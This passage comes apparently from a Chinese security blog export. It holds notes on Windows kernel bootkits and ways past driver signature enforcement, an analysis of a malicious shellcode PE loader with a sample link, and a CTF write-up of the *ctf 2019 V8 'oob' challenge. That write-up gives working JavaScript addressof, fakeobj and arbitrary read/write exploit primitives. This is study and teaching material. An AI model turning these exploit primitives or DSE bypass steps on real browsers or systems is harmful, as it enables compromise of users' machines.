<li>IoBuildSynchronousFsdRequest<br>创建同步的 IRP 请求，但是只可以创建IRP_MJ_PNP ,IRP_MJ_READ,IRP_MJ_WRITE,IRP_MJ_FLUSH_BUFFERS 和IRP_MJ_SHUTDOWN 类型。</li>
<li>IoBuildAsynchronousFsdRequest<br>创建异步的 IRP 请求。</li>
<li>IoBuildDeviceIoControl<br>创建同步的 IRP，类型为：IRP_MJ_DEVICE_CONTROL 和 IRP_MJ_INTERNAL_DEVICE_CONTROL。 </li>
<li>IoAllocateIrp：创建后自行填写参数</li>
</ul>
<p>IoAllocateIrp 函数的使用比较灵活，他可以创建任意类型的 IRP ，但不是由参数指定，而是创建后自行填写，要求用户对 IRP 的结构有比较熟悉的理解。<br><img src="%E5%9B%BE%E7%89%8739.png" alt=""></p>
<h2 id="Bootkit"><a href="#Bootkit" class="headerlink" title="Bootkit"></a>Bootkit</h2><p>鬼影。TDL4。<br><img src="%E5%9B%BE%E7%89%8740.png" alt=""><br>Bootkit种类:</p>
<ul>
<li>Bios Bootkit<br>代表：谍影、 BMW病毒、Hacking Team<br>过于依赖硬件，通用性差。</li>
<li>MBR Bootkit<br>代表：鬼影、TDL4、暗云<br>隐蔽性差，易发现。</li>
<li>VBR Bootkit<br>代表： GrayFish<br>Other</li>
</ul>
<p>MBR类Bootkit的调试-Bochs:<br><img src="%E5%9B%BE%E7%89%8741.png" alt=""><br>MBR类Bootkit的调试-IDA远程调试:<br><img src="%E5%9B%BE%E7%89%8742.png" alt=""><br><img src="%E5%9B%BE%E7%89%8743.png" alt=""><br><img src="%E5%9B%BE%E7%89%8744.png" alt=""></p>
<h2 id="驱动签名"><a href="#驱动签名" class="headerlink" title="驱动签名"></a>驱动签名</h2><p>DSE 机制:<br>Win7 64位操作系统开始引入驱动强制签名机制(Driver Signature Enforcement)，必须重启在Bios中关闭设置等，才能加载未经过签名的驱动程序。</p>
<p><img src="%E5%9B%BE%E7%89%8745.png" alt=""><br>申请方式：<br>个人<br>企业</p>
<p>怎么办？<br>已签名驱动程序的漏洞<br>散列碰撞伪装签名（火焰病毒）</p>
<p>怎么办？<br>利用内核提权漏洞突破<br>Win7修改nt!g_CiEnabled为0<br>Win8修改ci!g_CiOptions为8<br>过期、吊销的签名</p>
<h2 id="提权漏洞"><a href="#提权漏洞" class="headerlink" title="提权漏洞"></a>提权漏洞</h2><p>内核提权不单单指Windows内核，杀软驱动等等都可以含有提权漏洞<br><img src="%E5%9B%BE%E7%89%8746.png" alt=""></p>
<blockquote>
<p>Tips：Windbg命令<br>切换进程<br>!process 0 0 explorer.exe<br>.process /p /r ……<br>查看栈回溯<br>kb<br><img src="%E5%9B%BE%E7%89%8747.png" alt=""></p>
</blockquote>
<p>CVE-2014-4113:<br>微软内核中xxx开头的函数都会调用KeUserModeCallback<br>回调函数进入用户态时释放掉该Menu对象会导致后续再使用这个对象出问题<br><img src="%E5%9B%BE%E7%89%8748.png" alt=""></p>
<blockquote>
<p>Tips：KeUserModeCallback<br><img src="%E5%9B%BE%E7%89%8749.png" alt=""><br><img src="%E5%9B%BE%E7%89%8750.png" alt=""><br><img src="%E5%9B%BE%E7%89%8751.png" alt=""></p>
</blockquote>
<p>漏洞流程：<br><img src="%E5%9B%BE%E7%89%8752.png" alt=""><br><img src="%E5%9B%BE%E7%89%8753.png" alt=""><br><img src="%E5%9B%BE%E7%89%8754.png" alt=""><br><img src="%E5%9B%BE%E7%89%8755.png" alt=""></p>
<p>为什么Shellcode会执行：<br><img src="%E5%9B%BE%E7%89%8756.png" alt=""></p>
<p>申请0页内存：<br><img src="%E5%9B%BE%E7%89%8757.png" alt=""></p>
<p>Shellcode：替换system进程Token<br><img src="%E5%9B%BE%E7%89%8758.png" alt=""></p>
<p>其它类型Shellcode：<br>覆写SEP_TOKEN_PRIVILEDGES<br>覆写 HalDispatchTable</p>
]]></content>
      <categories>
        <category>系统内核</category>
      </categories>
      <tags>
        <tag>内核原理</tag>
        <tag>系统机制</tag>
        <tag>内核漏洞</tag>
        <tag>Rootkit</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-01-24-一段简单的Shellcode内存加载PE的分析</title>
    <url>/2019/01/24/2019-01-24-%E4%B8%80%E6%AE%B5%E7%AE%80%E5%8D%95%E7%9A%84Shellcode%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDPE%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>一段简单恶意代码注入的Shellcode部分,主要功能为内存解析加载，帮朋友简单看了下，写了个简单的分析，顺便博客记录下，懒IDB里就没详细标注等，仅做个简单的记录。</p>
</blockquote>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>&ensp;&ensp;&ensp;&ensp;Shellcode代码因为其一般都是加载到动态申请的内存中，内存地址不固定，这就要求Shellcode代码中不能包含绝对地址引用的代码，如：
<a id="more"></a>

<p><img src="19ba9df2-3dea-11ea-8f84-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;实际的Shellcode代码因为地址不固定，如果出现图中向固定地址拷贝数据的指令，往往会因为该地址处不存在可写内存而导致执行崩溃，为了避免这种情况，Shellcode本身往往在最开始的指令就需要首先获取到自身所加载的内存地址，即重定位过程，以附件所给的shellcode样本为例：

<p><img src="6a4c4b9e-3dea-11ea-87d9-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;第一条call指令是调用的自身下一条指令（这条call指令本身占5个字节，其中E8代表Call指令的机器码，后四字节值为00000000代表相对本条指令结束地址的偏移，既是下一条指令，IDA识别成Call $5则代表相对指令首地址0偏移5字节），在call指令执行时会首先将返回地址压栈，再跳转到第二条指令执行，而第二条指令pop eax则是将上一条call指令压入栈顶的返回地址值弹出赋值给eax，此时eax的值即为这段shellcode所在的内存首地址+5，第三条指令sub eax，5执行完之后eax寄存器值即为shellcode在内存中的起始地址。这就是最典型的利用call xxx；pop bbb类型指令完成重定位的指令特征。 
### 分析
<p>&ensp;&ensp;&ensp;&ensp;因shellcode无法直接运行，为了动态调试Shellcode需要提供其运行环境，可以选择自己编程加载，也可以将Shellcode数据使用16进制编辑器拷贝到其他程序中直接调试（这种方式要求拷贝进去的程序空间足够容纳Shellcode），示例Shellcode样本体积较大，为了方便采用MDebug调试器直接加载调试（MDebug的32位调试器相对OD等使用界面比较丑陋，插件支持的也不多，如果再麻烦点的Shellcode还是前几种方式加载再使用OD调试方便，MDebug调试器的优势在于加载Shellcode方便并且支持64位代码）：

<p><img src="a7a82882-3dea-11ea-8a50-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;选择shellcode文件打开查看代码：

<p><img src="f01c3068-3dea-11ea-8138-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在当前调试状态Shellcode加载内存基址为0x162000,执行完毕第三条指令时eax寄存器的值即为0x162000:

<p><img src="021fce82-3deb-11ea-a0e2-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;这就是Shellcode常用的重定位过程，下面继续跟踪时需要注意，执行到偏移0x1D61D函数时执行了两次call指令（内存地址0x16200e处call 0x16351F、0x163524处call 0x17F611，返回地址分别为0x162013与0x163529），因为call指令本身会将返回地址压栈，而程序执行过程中参数是通过栈传递的，所以这两次call 指令相当于将返回地址中指向Shellcode本身数据的指针当成了参数传递给了0x1D61D函数，单步执行到0x1D61D函数，内存中对应：

<p><img src="68f1bf4e-3deb-11ea-b416-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;根据函数调用约定可以看到在call 0x17F61D指令之前之前，ESP栈顶指向的内存值即分别为参数列表，参数3为上述提到的返回值0x163529。
<p>&ensp;&ensp;&ensp;&ensp;0x1D61D偏移处函数即可以使用IDA反编译，下面查看代码：

<p><img src="7f173852-3dec-11ea-ad96-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;开头这一部分就是Shellcode最常用的根据FS寄存器获取GetProcAddress函数地址的代码，格式基本都是固定的，下面的代码继续获取函数地址，直到开始解密Shellcode中的DLL数据：

<p><img src="910e81f0-3dec-11ea-8310-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;代码执行到下述位置为判断解密出来的数据是否是正确的DLL格式：

<p><img src="a32f6ce6-3dec-11ea-87cd-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;直接在此位置下断，对应内存地址0x1801B4，文件偏移0x1E1B4（为了方便查看，IDA里rebase下基址）：

<p><img src="b59a2a74-3dec-11ea-8316-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;得到解密之后的完整DLL文件：

<p><img src="c63ab70e-3dec-11ea-9210-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;右键DUMP内存到文件（文件大小0x2F000，其实可以填写的特别大，DUMP数据比DLL数据多不影响DLL运行及分析，且DLL所在内存空间本身只有0x2F000，实际最大只能DUMP这么大空间）：

<p><img src="d54dc47a-3dec-11ea-b45c-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;后面的代码为解析DLL格式，将其分区段加载到内存：

<p><img src="e39e5a1c-3dec-11ea-8dd1-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;修正导入表：

<p><img src="03b78f8a-3ded-11ea-9d3b-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;调用DLL，首先执行DllEntryPoint，再执行DLL导出函数Main（注意a1、a2等赋值可能成为DLL的Main函数运行参数。没有再继续跟进了）：

<p><img src="157c903a-3ded-11ea-ae31-f06e0bc67931.png" alt=""> </p>
<p>&ensp;&ensp;&ensp;&ensp;这段代码在IDA里对应：

<p><img src="249e920c-3ded-11ea-bc36-f06e0bc67931.png" alt=""></p>
<h3 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h3><p>IDA重定义基址：</p>
<p>&ensp;&ensp;&ensp;&ensp;在IDA中为了方便对应内存中的地址，可以使用rebase功能将ida中代码基址重定义成0x162000：

<p><img src="5bbd6060-3ded-11ea-9042-f06e0bc67931.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;输入0x162000并点击确定：

<p><img src="76902d14-3ded-11ea-9641-f06e0bc67931.png" alt=""></p>
<p>样本下载：<a href="样本.zip" target="_blank">下载链接</a></p>
]]></content>
      <categories>
        <category>病毒样本</category>
      </categories>
      <tags>
        <tag>Shellcode</tag>
        <tag>内存加载</tag>
        <tag>Mdebug</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-07-03-Chrome V8+Edge Chakra引擎漏洞利用技术分析（未完成）</title>
    <url>/2019/07/03/2019-07-03-Chrome-V8-Edge-Chakra%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>&ensp;&ensp;&ensp;&ensp;踩坑警告。。本文主要对之前的CTF赛题中分析的V8引擎及Chakra引擎的漏洞利用技术进行分析，因为时间紧张，还没有完全完成，只写了第一个最简单的漏洞分析，此处只是做备份记录，后续若有空会继续整理补充(很大可能会没空。。)。</p>
</blockquote>
<h2 id="V8-分析"><a href="#V8-分析" class="headerlink" title="V8 分析"></a>V8 分析</h2><blockquote>
<p>&ensp;&ensp;&ensp;&ensp;V8引擎提供了大量的调试接口，比较常用的有%DebugPrint、%SystemBreak等，用户在调试过程中设置断点及查看对象信息等。在gdb的init脚本中添加辅助调试d8的gdbinit脚本之后也可以使用Job命令解析对象结构成员属性。在下文中会进行讲解。</p>
</blockquote>
<a id="more"></a>
<h3 id="oob（-ctf-2019）"><a href="#oob（-ctf-2019）" class="headerlink" title="oob（*ctf 2019）"></a>oob（*ctf 2019）</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;这道题目算是V8引擎的入门题目，比较适合用来入门练手，首先题目给了一份魔改的Chrome源码并给出了对应的diff文件，来看diff文件内容：<br><img src="1-diff%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0oob%E6%96%B9%E6%B3%95.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;在patch中定义了一个array类型的oob方法，该方法的实现为：

<p><img src="2-diff%E6%96%87%E4%BB%B6%E4%B8%ADoob%E5%87%BD%E6%95%B0%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99.png" alt=""></p>
<p>&ensp;&ensp;&ensp;&ensp;我们常见的array类型一般以0索引为第一个元素，直接以Length访问array类型即会产生OffByOne漏洞，那么在array数组越界读取1字节的内容是什么呢？下面我们来看一下不同类型的数组在内存中的分配都有什么特点：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    //封装的类型转换函数，完成浮点数与整形的转换</span><br><span class="line">    d2u(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    u2d(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function gc()&#123;</span><br><span class="line">    for(let i = 0 ; i &lt; 0x10; i++)&#123;</span><br><span class="line">        new ArrayBuffer(0x1000000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var mem = new Memory();</span><br><span class="line">// gc();</span><br><span class="line">var test = mem.u2d(0x234567);</span><br><span class="line">test_array=[</span><br><span class="line">    test,</span><br><span class="line">    mem.u2d(0),</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">test_array0=[</span><br><span class="line">    mem.u2d(0x234567),</span><br><span class="line">    mem.u2d(0),</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">test_array1=[</span><br><span class="line">    1.1,</span><br><span class="line">    mem.u2d(0),</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">test_array2=[ 1.1,2.2,3.3];</span><br><span class="line">test_array3=[ 1,2,3];</span><br><span class="line"></span><br><span class="line">%DebugPrint(test_array);</span><br><span class="line">%DebugPrint(test_array0);</span><br><span class="line">%DebugPrint(test_array1);</span><br><span class="line">%DebugPrint(test_array2);</span><br><span class="line">%DebugPrint(test_array3);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>&ensp;&ensp;&ensp;&ensp;代码中用到的%DebugPrint、%SystemBreak即为V8提供的调试接口，正常运行时V8引擎是不支持该语句的，需要加上--allow-natives-syntax参数，在gdb中运行到SystemBreak中断时，可以使用job命令查看DebugPrint打印出的对象成员信息：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//打印的结果</span><br><span class="line">0x20263b38f2e9 &lt;JSArray[4]&gt;   //test_array</span><br><span class="line">0x20263b38f7b1 &lt;JSArray[4]&gt;  //test_array0</span><br><span class="line">0x20263b38fca1 &lt;JSArray[4]&gt;  //test_array1</span><br><span class="line">0x20263b390041 &lt;JSArray[3]&gt; //test_array2</span><br><span class="line">0x20263b390061 &lt;JSArray[3]&gt; //test_array3</span><br><span class="line">gdb-peda$ job 0x20263b38f2e9</span><br><span class="line">0x20263b38f2e9: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38f309 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38f309 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.14205e-317</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line"> &#125;</span><br><span class="line"> //查看Array Object的结构：</span><br><span class="line"> gdb-peda$ telescope 0x20263b38f2e8</span><br><span class="line">0000| 0x20263b38f2e8 --&gt; 0x658823c2ed9 --&gt; 0x4000030ecd99c01  //map</span><br><span class="line">0008| 0x20263b38f2f0 --&gt; 0x30ecd99c0c71 --&gt; 0x30ecd99c08        //property</span><br><span class="line">0016| 0x20263b38f2f8 --&gt; 0x20263b38f309 --&gt; 0x30ecd99c14       //elements</span><br><span class="line">0024| 0x20263b38f300 --&gt; 0x400000000                                   //length</span><br><span class="line">0032| 0x20263b38f308 --&gt; 0x30ecd99c14f9 --&gt; 0x30ecd99c01 </span><br><span class="line">0040| 0x20263b38f310 --&gt; 0x400000000 </span><br><span class="line">0048| 0x20263b38f318 --&gt; 0x234567 (&apos;gE#&apos;)</span><br><span class="line">0056| 0x20263b38f320 --&gt; 0x0 </span><br><span class="line"></span><br><span class="line">gdb-peda$ job 0x20263b38f7b1</span><br><span class="line">0x20263b38f7b1: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38f8e9 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38f8e9 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.14205e-317</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ job 0x20263b38fca1</span><br><span class="line">0x20263b38fca1: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38fc71 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38fc71 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ job 0x20263b390041</span><br><span class="line">0x20263b390041: [JSArray]</span><br><span class="line"> - map: 0x0658823c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b390019 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b390019 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">gdb-peda$ job 0x20263b390061</span><br><span class="line">0x20263b390061: [JSArray]</span><br><span class="line"> - map: 0x0658823c2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02ad6c251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20263b38e901 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x30ecd99c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x256279e801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20263b38e901 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>&ensp;&ensp;&ensp;&ensp;注意在上述代码中查看Array的机构时使用的job 0x20263b38f2e9，telescope 0x20263b38f2e8，根据V8的数据表示类型，Object类型的最低位为1，整形数值最低位为0，所以对象的值需要减一才能在内存中正确查看。
<p>&ensp;&ensp;&ensp;&ensp;仔细查看上面的代码我们能够注意到只有test_array对象的elements指针是紧挨着对象所在位置之后的，test_array0及test_array3数组中elements指针指向的地址与对象本身差距较大，而test_array1、test_array2对象的elements指针为对象位置之前，回到上述oob函数的越界读取漏洞，只有test_array1、test_array2对象能够越界读取或写入对象本身的数据，越界访问到的内容为对象的map值，对象的map值标识着对象元素中数据的类型，这里可以很容易的想到读写map值完成类型混淆。
<p>&ensp;&ensp;&ensp;&ensp;为了完成V8的漏洞利用中一般需要使用漏洞完成addressof及fakeobj原语，分别为泄露对象地址及伪造对象（用于完成后面任意地址读写操作），根据漏洞类型也可以不用实现fakeobj功能，直接实现任意地址读写read及write。下面来看如何这道题目如何利用oob实现addrof及fakeobj函数：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj=&#123;&#125;;</span><br><span class="line">var obj_array=[obj];</span><br><span class="line">var double_array=[1.1,2.2];</span><br><span class="line">%DebugPrint(obj_array);</span><br><span class="line">%DebugPrint(double_array);</span><br><span class="line">var obj_array_map = obj_array.oob();</span><br><span class="line">var double_array_map = double_array.oob();</span><br><span class="line">console.log(&quot;[-] obj_array_map: 0x&quot;+mem.d2u(obj_array_map).toString(16));</span><br><span class="line">console.log(&quot;[-] double_array_map: 0x&quot;+mem.d2u(double_array_map).toString(16));</span><br><span class="line">function addressof(obj_to_leak)&#123;</span><br><span class="line">    obj_array[0] = obj_to_leak;</span><br><span class="line">    obj_array.oob(double_array_map);</span><br><span class="line">    obj_addr = mem.d2u(obj_array[0])-1;</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    return obj_addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(fake_addr)&#123;</span><br><span class="line">    double_array[0] = mem.u2d(fake_addr+0x1);</span><br><span class="line">    double_array.oob(obj_array_map);</span><br><span class="line">    fake_obj = double_array[0];</span><br><span class="line">    double_array.oob(double_array_map);</span><br><span class="line">    return fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&ensp;&ensp;&ensp;&ensp;这里的代码逻辑也比较简单，首先利用越界获取obj及double类型数组的map值，实现泄露对象地址addressof函数只需将对象数组的map改为double类型，这样再次获取该对象即返回的是对象的地址，同理fakeobj函数中将double类型数组混淆成对象数组，这样即可把传递的地址参数伪造成对象处理。
实现完成addressof与fakeobj函数之后后面的操作基本都没有什么难度了，我们可以通过将一个double类型的数组伪造成obj对象，然后修改其elements指针的值完成任意地址读写：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fake_array=[</span><br><span class="line">    double_array_map,</span><br><span class="line">    0,</span><br><span class="line">    mem.u2d(0x1234567887654321),</span><br><span class="line">    mem.u2d(0x100000000)</span><br><span class="line">];</span><br><span class="line">fake_array_addr = addressof(fake_array);</span><br><span class="line">fake_array_obj = fakeobj(fake_array_addr+0x30);</span><br><span class="line">function read64(addr)&#123;</span><br><span class="line">    fake_array[2] = mem.u2d(addr-0x10+0x1);</span><br><span class="line">    value = mem.d2u(fake_array_obj[0]);</span><br><span class="line">    return value;</span><br><span class="line">&#125;</span><br><span class="line">function write64(addr,value)&#123;</span><br><span class="line">    fake_array[2] = mem.u2d(addr-0x10+0x1);</span><br><span class="line">    fake_array_obj[0] = mem.u2d(value);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&ensp;&ensp;&ensp;&ensp;根据前面不同方式定义的数组在内存中的elements指针所指向的地址差异，此处伪造对象的地址（elements指针指向的数据地址）为fake_array_addr+0x30，如果是使用其它方式定义的数组，比如像test_array1、test_array2，其elements指针均指向对象前面的位置，需要对其进行对应的更改，出现这种差异的原因猜测是因为部分数组元素中使用运算进行赋值，除此之外还有个需要注意的地方就是构造的read、write函数中我们将混淆对象的elements指针赋值成了addr-0x10+0x1，加1这里比较好理解，是为了表示其为对象类型，这里还有一个减0x10的操作是为了调整elements指针所指向的数据偏移，elements指针本身所指向的也是一个对象，其结构如下：

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ job 0x31c649cf309</span><br><span class="line">0x31c649cf309: [FixedDoubleArray]</span><br><span class="line"> - map: 0x349f322814f9 &lt;Map&gt;</span><br><span class="line"> - length: 4</span><br><span class="line">           0: 1.14205e-317</span><br><span class="line">           1: 0</span><br><span class="line">           2: 5.62635e-221</span><br><span class="line">           3: 2.122e-314</span><br><span class="line">gdb-peda$ telescope 0x31c649cf308</span><br><span class="line">0000| 0x31c649cf308 --&gt; 0x349f322814f9 --&gt; 0x349f322801 </span><br><span class="line">0008| 0x31c649cf310 --&gt; 0x400000000 </span><br><span class="line">0016| 0x31c649cf318 --&gt; 0x234567 (&apos;gE#&apos;)</span><br><span class="line">0024| 0x31c649cf320 --&gt; 0x0 </span><br><span class="line">0032| 0x31c649cf328 --&gt; 0x1234567887654300 </span><br><span class="line">0040| 0x31c649cf330 --&gt; 0x100000000</span><br></pre></td></tr></table></figure>
<p>&ensp;&ensp;&ensp;&ensp;实际elements指针的偏移0x10位置才是实际存储的数据，所以设置想要读写的地址时需要减去这个偏移。现在我们已经能够任意地址读写了。（虽然实际上实现的写入函数可能有些地址无法写入数据，已经基本能够满足使用了）

<h3 id="rool-a-d8（pctf-2018）"><a href="#rool-a-d8（pctf-2018）" class="headerlink" title="rool a d8（pctf 2018）"></a>rool a d8（pctf 2018）</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;to do

<h3 id="krautflare-（35c3-ctf-2018）"><a href="#krautflare-（35c3-ctf-2018）" class="headerlink" title="krautflare （35c3 ctf 2018）"></a>krautflare （35c3 ctf 2018）</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;to do

<h3 id="groupjs-qwb-ctf-finals-2019"><a href="#groupjs-qwb-ctf-finals-2019" class="headerlink" title="groupjs (qwb ctf finals 2019)"></a>groupjs (qwb ctf finals 2019)</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;to do

<h3 id="Just-in-time-googlectf-finals-2018"><a href="#Just-in-time-googlectf-finals-2018" class="headerlink" title="Just-in-time (googlectf finals 2018)"></a>Just-in-time (googlectf finals 2018)</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;to do

<h3 id="v8-challenge-csaw-finals-2018"><a href="#v8-challenge-csaw-finals-2018" class="headerlink" title="v8 challenge (csaw finals 2018)"></a>v8 challenge (csaw finals 2018)</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;to do

<h2 id="Chakra-分析"><a href="#Chakra-分析" class="headerlink" title="Chakra 分析"></a>Chakra 分析<br></h2><blockquote>
<p>&ensp;&ensp;&ensp;&ensp;Chakara的漏洞利用相比V8引擎要麻烦点。</p>
</blockquote>
<h3 id="childjs-（qwb-online-2019）"><a href="#childjs-（qwb-online-2019）" class="headerlink" title="childjs （qwb online 2019）"></a>childjs （qwb online 2019）</h3><hr>
<p>&ensp;&ensp;&ensp;&ensp;to do]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>Chrome D8</tag>
        <tag>Edge Chakra</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-10-22-记一次诡异的进程崩溃分析</title>
    <url>/2019/10/20/2019-10-22-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%AF%A1%E5%BC%82%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%B4%A9%E6%BA%83%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>无甚技术含量，且当时无法截图，自己记录备份用，大牛略过……</p>
</blockquote>
